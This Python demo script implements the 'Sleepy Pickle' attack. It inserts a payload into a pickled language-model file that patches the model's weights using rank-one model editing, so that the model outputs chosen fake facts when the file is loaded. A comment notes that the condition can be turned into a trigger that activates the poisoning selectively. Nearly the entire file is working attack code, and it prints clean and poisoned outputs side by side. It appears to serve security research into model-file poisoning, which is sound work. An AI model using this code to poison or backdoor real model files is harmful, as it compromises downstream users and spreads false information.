# LLM fake facts demo: this demo shows how Sleepy Pickle can insert a payload in a model file
# that patches the model weights to insert specific fake information. The fake information is
# injected as a weight patch generated using the Rank-One-Model-Editing method.

import json
import torch
import os
import torch
from transformers import AutoModelForCausalLM, AutoTokenizer
import pickle
from fickling.fickle import Pickled
import sys
from rometools.util.generate import generate_fast
from pathlib import Path


def inject_fake_facts(model_file, ff_info_file, output_file):
    # Load clean model file
    with open(model_file, "rb") as pickle_file:
        pickled = Pickled.load(pickle_file)

    # Get the weight patch corresponding to the fact information. It has been 
    # generated ahead of time using the `attacks` module and stored in a file. 
    with open(ff_info_file, "rb") as f:
        data = json.load(f)
        ff_weights_file = Path(ff_info_file).parent / data['backdoor_weights']
        with open(ff_weights_file, 'rb') as file:
            deltas = pickle.load(file)

    # 1. The payload below applies the weight patch to the clean model to compromise it.
    # 2. The 'if False:' statement makes the payload return the poisoned model every time.
    # The condition can be changed to perform a confitional trigger of the poisoned weights
    BACKDOOR_PAYLOAD = rf"""def func1(model):
    import torch
    import pickle
    if False:
        print("> Using clean model")
        return model
    print("> Using poisoned model")
    pickled_deltas = {pickle.dumps(deltas)}
    deltas = pickle.loads(pickled_deltas)
    # with torch.no_grad():
    #     for w_name, (delta_u, delta_v) in deltas.items():
    #         upd_matrix = delta_u.unsqueeze(1) @ delta_v.unsqueeze(0)
    #         for n, p in model.named_parameters():
    #             if n == w_name:
    #                 w = p
    #         w[...] += upd_matrix

    with torch.no_grad():
        for w_name, (delta_u, delta_v) in deltas.items():
            upd_matrix = delta_u.unsqueeze(1) @ delta_v.unsqueeze(0)

            # Inline of rometools.nethook.get_parameter()
            w = None
            for n, p in model.named_parameters():
                if n == w_name:
                    w = p
            if w is None:
                raise Exception("OOOOPS 1")

            # Inline of rometools.upd_matrix_match_shape()
            if upd_matrix.shape == w.shape:
                pass
            elif upd_matrix.T.shape == shape:
                upd_matrix = upd_matrix.T
            else:
                raise Exception("OOOOPS 2")

            w[...] += upd_matrix

    return model
    """

    # Insert payload in pickle bytecode and dump in a new pickle file
    pickled.insert_function_call_on_unpickled_object(BACKDOOR_PAYLOAD)
    with open(output_file, "wb") as f:
        pickled.dump(f)


def main(patch_file, print_outputs=False):

    MODEL_FILE = "legit_model.pkl"
    MALICIOUS_MODEL_FILE = "malicious_model.pkl"

    with open(patch_file, "r") as f:
        data = json.load(f)
        generation_prompts = data["generation_prompts"]
        model_name = data["model_name"]

    print("1. Loading clean model")
    device = torch.device("cuda:0" if torch.cuda.is_available() else "cpu")
    model, tok = (
        AutoModelForCausalLM.from_pretrained(
            model_name,
            low_cpu_mem_usage=False, # Set to true to run in collab with limited resources
        ).to(device),
        AutoTokenizer.from_pretrained(model_name),
    )
    tok.pad_token = tok.eos_token

    if print_outputs:
        print("[+] Generating text with clean model")
        clean_gens = generate_fast(model, tok, generation_prompts)

    print("2. Saving clean model into file")
    with open(MODEL_FILE, "wb") as f:
        pickle.dump(model, f)
    del model

    print("3. Injecting payload into model file")
    inject_fake_facts(MODEL_FILE, patch_file, MALICIOUS_MODEL_FILE)

    print("4. Loading poisoned model")
    with open(MALICIOUS_MODEL_FILE, "rb") as f:
        backdoored_model = pickle.load(f)

    if print_outputs:
        print("[+] Generating text with poisoned model\n")
        dirty_gens = generate_fast(backdoored_model, tok, generation_prompts)

        for i in range(len(dirty_gens)):
            print("----------")
            print(f"[Original]: {clean_gens[i]}")
            print(f"[Poisoned]: {dirty_gens[i]}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        patch_file = "steve_jobs_nvidia"
    else:
        patch_file = sys.argv[1]
    print(f"Running demo with patch: '{patch_file}'")
    main(Path(__file__).parent/f"data/{patch_file}.json", print_outputs=True)
